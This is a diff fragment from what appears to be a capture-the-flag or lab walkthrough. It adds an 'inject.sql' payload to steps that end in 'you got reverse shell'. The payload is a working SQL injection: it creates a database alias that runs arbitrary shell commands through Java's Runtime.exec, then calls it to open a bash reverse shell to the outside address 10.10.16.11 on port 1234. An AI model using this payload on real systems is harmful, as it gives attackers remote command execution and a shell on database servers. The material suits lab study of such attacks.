@@ -58,8 +58,15 @@ priority: 2
 5. Use the POC payload with YOUR_MACHINE_IP on port 8000.
 6. BOOOM, you got reverse shell.
 
-
-
+**inject.sql**
+```html
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {"bash", "-c", cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+        return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
+```
 
 
 
